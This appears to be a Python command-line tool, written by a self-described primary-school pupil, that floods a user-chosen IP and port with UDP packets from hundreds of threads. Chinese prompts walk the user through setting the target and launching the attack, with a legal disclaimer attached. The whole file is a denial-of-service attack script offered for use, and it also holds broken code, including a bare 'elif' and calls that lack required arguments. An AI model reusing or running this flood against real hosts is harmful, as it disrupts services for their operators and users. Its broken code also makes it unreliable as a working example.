"""
Author: Lucky Pupil ;
Date:2022.05.01 ;
National: Chinese ;
Project Name: Dos Attack ;
Education: Fifth grade of primary school
"""
import socket
import threading
import cmd
import sys
import random
import time

str_byte = '我是在攻击你' * 500
randbyte = str_byte.encode()
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
count = 0
threads = []


class Main(cmd.Cmd):
	prompt = 'Dog_dos>'
	intro = '本工具仅限学习与装逼使用，请勿用于违法用途\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。\n如非法使用，后果自负'
	def do_tutorial(self,arg):
		'教你如何使用本工具'
		self.tutorial(arg)

	def do_set_thread_num(self,arg):
		'设置攻击线程数量'
		self.set_thread_num(arg)

	def do_set_port(self,arg):
		'设置攻击端口'
		self.set_port(arg)

	def do_set_ip(self,arg):
		'设置攻击ip'
		self.set_ip(arg)

	def do_attack(self,arg):
		'攻击函数'
		self.attack(arg)

	def do_exit(self,arg):
		'退出'
		self.exit(arg)

	def exit(self,arg):
		sys.exit(0)

	def tutorial(self,chose):
		print('首先，你必须使用"set_port"命令设置攻击目标端口，一般为80')
		time.sleep(1)
		print('再者，你必须使用"set_ip"命令设置攻击目标IP地址，注意，是IP地址！可以用commond命令行里的ping命令+网址获取网址的IP地址')
		time.sleep(1)
		print('然后，你必须使用"set_thread_num"命令设置攻击线程数量，线程越多，攻击效率，以及攻击成功的可能性越高，但是不是越多越好，多了电脑容易卡，根据自己电脑情况决定，建议数量为500.')
		time.sleep(1)
		print('最后，使用"attack"命令，进行攻击，输入y,即可开始攻击，会显示攻击次数，有可能又被网站管理员拉黑的风险，后果自负')
	def set_thread_num(self,num):
		self.thread = int(num)
		print('Set thread ', num)

	def set_port(self,num):
		self.port = int(num)
		print('Set port ', num)

	def set_ip(self,ip):
		self.ip = ip
		print('Set IP address ', ip)

	def attack(self,chose):
		chose = input('你真的要攻击吗\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。（确定输入y，终止输入n）')
		if chose == 'y' or chose == 'Y':
			self.true_to_attack() # attack
		elif chose == 'n' or chose == 'N':
			self.exit()
		elif:
			print('请规范输入')
			self.attack()
			
	def true_to_attack_attack(self):
		for i in range(200001):
			so.sendto(randbyte,(self.ip,self.port))
			print('这是第',i+1,'攻击!')

	def true_to_attack_thread(self):
		for i in range(1,self.thread+1):
			time.sleep(0.1)
			send = threading.Thread(target=self.true_to_attack_attack,args=())
			threads.append(send)
			print(i,"个线程生成成功")
		for j in threads:
			j.start()

	def true_to_attack(self):
		self.true_to_attack_thread()


Main().cmdloop()
